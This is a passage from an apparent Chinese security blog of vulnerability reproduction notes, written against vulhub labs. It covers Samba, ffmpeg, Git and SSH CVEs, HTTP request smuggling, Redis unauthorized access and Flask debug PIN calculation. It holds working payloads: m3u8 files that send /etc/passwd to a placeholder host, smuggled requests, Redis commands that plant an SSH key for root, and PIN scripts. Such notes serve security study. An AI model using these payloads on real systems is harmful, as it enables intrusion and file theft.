class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处我们还需要一个用户名字典，可以自行构造，也可以用github上面一个开源项目<span class="exturl"><a class="exturl__link"   href="https://github.com/danielmiessler/SecLists/" >SecLists</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，节约时间我们自行构造一个简短list，最终测试结果如下</p><pre class="line-numbers language-none"><code class="language-none">admin is not a valid user!bin is a valid user!sys is a valid user!sync is a valid user!games is a valid user!man is a valid user!lp is a valid user!111 is not a valid user!1243 is not a valid user!sahdsa is not a valid user!jalba is not a valid user!dsa is not a valid user!fe is not a valid user!qf is not a valid user!ds is not a valid user!vc is not a valid user!dsshg is not a valid user!rsa is not a valid user!grdfsbvfgd is not a valid user!sb is not a valid user!fgd is not a valid user!s is not a valid user!bgfd is not a valid user!s is not a valid user!g is not a valid user!fds is not a valid user!g is not a valid user!fd is not a valid user!sgf is not a valid user!ds is not a valid user!g is not a valid user!fdsh is not a valid user!tr is not a valid user!wnbyrsbf is not a valid user!dgs is not a valid user!root is a valid user!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然漏洞存在，而当我们对高级版本的SSH进行测试时，exp失效</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206171757123.png"></p></li></ol>        <h2 id="Samba（SMB）"   >          <a href="#Samba（SMB）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Samba（SMB）" class="headerlink" title="Samba（SMB）"></a>Samba（SMB）</h2>              <h3 id="CVE-2017-7494"   >          <a href="#CVE-2017-7494" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-7494" class="headerlink" title="CVE-2017-7494"></a>CVE-2017-7494</h3>      <p>漏洞内容：只需要有一个可以写入文件的用户就可以提权到root权限</p><p>漏洞作用：RCE</p><p>影响范围：Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本</p><p>漏洞复现：</p><ol><li><p>vulhub直接起一个docker</p></li><li><p>使用msf搜索对应漏洞<code>search is_known_pipename</code></p></li><li><p>使用set命令设置rhost</p></li><li><p>如果对方服务开启了匿名登录直接使用run命令即可，如果已知用户名密码可使用set smbuser和smbpass来指定用户登录</p></li><li><p>成功拿shell</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208101616840.png"></p></li></ol>        <h2 id="ffmpeg"   >          <a href="#ffmpeg" class="heading-link"><i class="fas fa-link"></i></a><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h2>              <h3 id="CVE-2016-1897"   >          <a href="#CVE-2016-1897" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2016-1897" class="headerlink" title="CVE-2016-1897"></a>CVE-2016-1897</h3>      <p>漏洞内容：首先了解一下m3u8文件格式，m3u8是一种索引文件，用于HLS协议传输媒体流，m3u8索引指向一个个小的媒体流碎片</p><blockquote><p>简而言之，<span class="exturl"><a class="exturl__link"   href="https://links.jianshu.com/go?to=https://zh.wikipedia.org/wiki/HTTP_Live_Streaming" >HLS</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 是新一代流媒体传输协议，其基本实现原理为将一个大的媒体文件进行分片，将该分片文件资源路径记录于 m3u8 文件（即 playlist）内，其中附带一些额外描述（比如该资源的多带宽信息···）用于提供给客户端。客户端依据该 m3u8 文件即可获取对应的媒体资源，进行播放。</p></blockquote><p>一个基本的m3u8文件格式如下</p><blockquote><ul><li><p>m3u8 文件必须以 utf-8 进行编码，不能使用 Byte Order Mark（BOM）字节序， 不能包含 utf-8 控制字符（U+0000 ~ U_001F 和 U+007F ~ u+009F）。</p></li><li><p>m3u8 文件的每一行要么是一个 URI，要么是空行，要么就是以 <strong>#</strong> 开头的字符串。不能出现空白字符，除了显示声明的元素。</p></li><li><p>m3u8 文件中以 <strong>#</strong> 开头的字符串要么是注释，要么就是标签。标签以 <strong>#EXT</strong> 开头，大小写敏感。</p></li><li><p>```<br>各参数说明：<br>#EXTM3U 标签是 m3u8 的文件头，开头必须要这一行<br>#EXT-X-MEDIA-SEQUENCE 表示每一个media URI 在 PlayList中只有唯一的序号，相邻之间序号+1<br>#EXTINF:10.0, 表示该一段 TS 流文件的长度<br>#EXT-X-ENDLIST 这个相当于文件结束符</p><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;m3u8#EXTM3U#EXT-X-TARGETDURATION:10#EXTINF:9.009,http:&#x2F;&#x2F;media.example.com&#x2F;first.ts#EXTINF:9.009,http:&#x2F;&#x2F;media.example.com&#x2F;second.ts#EXTINF:3.003,http:&#x2F;&#x2F;media.example.com&#x2F;third.ts#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></blockquote><p>而在ffmpeg特定版本中并没有对URI进行任何检查，此处可导致SSRF，只需要监听一个端口然后直接访问即可验证</p><p>任意文件读取成因是在ffmpeg中有concat函数可以对URI进行拼接，我们只要将文件作为http请求的参数即可带出，但直接使用concat并不会对文件请求访问，所以我们需要一个小技巧，也就是通过主m3u8访问次级m3u8来使得文件被读取</p><p>kkk.txt</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http:&#x2F;&#x2F;xxx&#x2F;test.txt|file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>text.txt</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:,http:&#x2F;&#x2F;xxx&#x2F;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>xxx.m3u8</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-TARGETDURATION:6#EXTINF:10.0,concat:http:&#x2F;&#x2F;xxx&#x2F;kkk.txt#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将kkk.txt和text.txt都上传到服务器，然后用ffmpeg处理xxx.m3u8文件即可带出passwd文件首行</p>        <h2 id="Git"   >          <a href="#Git" class="heading-link"><i class="fas fa-link"></i></a><a href="#Git" class="headerlink" title="Git"></a>Git</h2>              <h3 id="CVE-2017-8386"   >          <a href="#CVE-2017-8386" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-8386" class="headerlink" title="CVE-2017-8386"></a>CVE-2017-8386</h3>      <p>漏洞成因：</p><ul><li><p>当我们想从github克隆一份代码下来的时候，会有ssh克隆的选项，我们去随便捞一个地址，找到Clone with SSH里列出的地址：<code>git@github.com:Jlan45/j1an.github.io.git</code>其实就是通过ssh协议连接github使用git用户将这个文件搞下来</p></li><li><p>那我们猜想一下，是不是直接ssh链接就能和我们链接一个服务器一样去执行命令呢</p></li><li><p>测试发现我们确实连接上了服务器，但是服务器给我们弹了一句话就让我们强制退出了</p></li><li><p>这是怎么做到的咧</p></li><li><blockquote><p>那么，github这类git服务商是怎么实现上述“安全”通信的流程的呢？</p><p>让用户可以通过ssh认证身份，但又不给用户shell，这个过程有两种方法实现：</p><p>创建系统用户git的时候将其shell设置成git-shell<br>在authorized_keys文件每个ssh-key的前面设置command，覆盖或劫持重写原本的命令<br>第一种方法比较直观，就是创建用户的时候不给其正常的bash或sh的shell，而是给它一个git-shell。git-shell是一个沙盒环境，在git-shell下，只允许执行沙盒内包含的命令。<br>————————————————<br>版权声明：本文为CSDN博主「建瓯最坏」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/JiangBuLiu/article/details/95065034" >https://blog.csdn.net/JiangBuLiu/article/details/95065034</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote></li><li><p>在github中确实是只有这三条命令可用</p><ul><li><code>git-receive-pack &lt;argument&gt;</code></li><li><code>git-upload-pack &lt;argument&gt;</code></li><li><code>git-upload-archive &lt;argument&gt;</code></li></ul></li><li><p>但是后面有了参数，我们就可以通过–help来打开一个man页面，并且其会自动调用less命令，而通过less命令我们就能直接通过<code>shift+e</code>键来实现任意文件读取，甚至可以通过<code>!命令</code>来实现任意命令执行</p></li></ul><p>漏洞内容：通过github的SSH实现任意文件读取</p><p>漏洞复现：</p><ol><li><p>首先还是vulhub启一个服务器，可以看到目录下有id_rsa私钥文件，我们直接通过这个私钥来连接docker，并且执行<code>git-upload-archive &#39;--help&#39;</code>命令</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010033494.png"></p><p>可以看到命令执行成功进入了man页面</p></li><li><p>尝试读取/etc/passwd<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010034597.png"></p><p>读取成功</p></li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>破破烂烂碎碎知识汇总</title>
      <link href="/posts/ad1540aa.html"/>
      <url>/posts/ad1540aa.html</url>
      
        <content type="html"><![CDATA[        <h2 id="HTTP部分请求头"   >          <a href="#HTTP部分请求头" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP部分请求头" class="headerlink" title="HTTP部分请求头"></a>HTTP部分请求头</h2>              <h3 id="Transfer-Encoding"   >          <a href="#Transfer-Encoding" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3>      <p>其中中有一类特定编码:chunked编码.该编码将实体分块传送并逐块标明长度,直到长度为0块表示传输结束, 这在实体长度未知时特别有用(比如由数据库动态产生的数据)，该编码格式为</p><pre class="line-numbers language-none"><code class="language-none">Transfer-Encoding: chunked\r\n\r\n16进制表示下一个分块的长度\r\n要发送的数据\r\n重复上列数据直到最终结尾使用一个空的数据块来表示内容结束0\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span>        <h2 id="内存马"   >          <a href="#内存马" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2>      <p>条件：/proc/某进程pid/mem可读</p>        <h2 id="HTTP请求走私"   >          <a href="#HTTP请求走私" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2>              <h3 id="成因"   >          <a href="#成因" class="heading-link"><i class="fas fa-link"></i></a><a href="#成因" class="headerlink" title="成因"></a>成因</h3>      <p>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头。</p>        <h3 id="分类"   >          <a href="#分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#分类" class="headerlink" title="分类"></a>分类</h3>      <ul><li>CLTE：前端服务器使用 <code>Content-Length</code> 头，后端服务器使用 <code>Transfer-Encoding</code> 头</li><li>TECL：前端服务器使用 <code>Transfer-Encoding</code> 标头，后端服务器使用 <code>Content-Length</code> 标头。</li><li>TETE：前端和后端服务器都支持 <code>Transfer-Encoding</code> 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</li></ul>        <h3 id="攻击方式"   >          <a href="#攻击方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3>      <ol><li><p>CL不为0的GET请求</p><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 <code>Content-Length</code> 头，不进行处理。例如下面这个例子：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">44\r\n</span></span><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/secret</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时前端对 <code>Content-Length</code> 头进行了处理，将后续伪造的GET请求传入了后端，而后端则没有处理，直接将下面的内容当做了又一个独立请求进行处理</p></li><li><p>双CL值不同的请求</p><p>根据RFC 7230，当服务器收到的请求中包含两个 <code>Content-Length</code> ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 <code>Content-Length</code> 值时，就会出现漏洞。例如：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">8\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">7\r\n</span></span>12345\r\na<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个例子中的a就会被带入到下一个请求中，使得下一个请求变成了</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">aGET / HTTP/1.1\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>CL-TE</p><p>指前端服务器处理 <code>Content-Length</code> 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 <code>Content-Length</code> ，处理 <code>Transfer-Encoding</code> 。例如：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">4\r\n</span></span><span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked\r\n</span></span>\r\n12\r\naPOST / HTTP/1.1\r\n\r\n0\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处前端只处理了 <code>Content-Length</code> 这一请求头而忽略了 <code>Transfer-Encoding</code> 请求头</p></li><li><p>TE-TE</p><p>指前后端服务器都处理 <code>Transfer-Encoding</code> 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 <code>Transfer-encoding</code> ，测试例如：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-length</span><span class="token punctuation">:</span> <span class="token header-value">4\r\n</span></span><span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked\r\n</span></span><span class="token header"><span class="token header-name keyword">Transfer-encoding</span><span class="token punctuation">:</span> <span class="token header-value">cow\r\n</span></span>\r\n5c\r\naPOST / HTTP/1.1\r\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded\r\n</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">15\r\n</span></span>\r\nx=1\r\n0\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>        <h2 id="PHP-session反序列化"   >          <a href="#PHP-session反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h2>              <h2 id="Redis未授权访问"   >          <a href="#Redis未授权访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2>      <p>其实并不是CVE，但也是个蛮有趣的漏洞，众所周知redis和memcached这俩难兄难弟是不需要密码的，但是他们同时又有很高的权限，所以当这俩货对外网开启访问权限的时候就很容易被扫描到并且被搞，那么话不多说，开干！</p><p>利用条件：Redis开放给外部访问并且知道ssh链接端口</p><p>漏洞利用：</p><ol><li>首先搭建好redis服务并更改配置文件打开外部访问</li><li>在本机中使用<code>ssh-keygen -t rsa</code>命令来自动生成公私钥</li><li>下面就是将公钥写入受害机器的<code>.ssh</code>目录下，此处我们利用redis备份数据库文件的方式进行，首先使用redis命令将内容写入到一个数据中<code>(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) | redis-cli -h 受害者IP -p redis端口 -x set crackit</code>，这样我们就将公钥写入到了数据库中</li><li>写入到数据库中还需要将公钥保存为文件才能生效，我们利用redis命令来将公钥文件以数据库备份的形式放入<code>/root/.ssh/authorized_keys</code>，使用<code>config set dir /root/.ssh;config set dbfilename authorized_keys;save;</code>来将数据库文件保存</li><li>使用私钥直接连接受害者服务器<code>ssh -i ~/.ssh/id_rsa root@受害者IP -p SSH服务端口</code></li></ol>        <h2 id="Flask-PIN值计算"   >          <a href="#Flask-PIN值计算" class="heading-link"><i class="fas fa-link"></i></a><a href="#Flask-PIN值计算" class="headerlink" title="Flask PIN值计算"></a>Flask PIN值计算</h2>      <p>直接放脚本算了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5 python3.6</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'flaskweb'</span><span class="token comment"># flask执行用户</span>     <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># 默认</span>     <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># 默认</span>     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),报错也可</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1 python3.8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span><span class="token comment"># /etc/passwd</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># 报错得到</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16进制转10进制</span>    <span class="token comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class="token comment">#  /proc/self/cgroup</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> 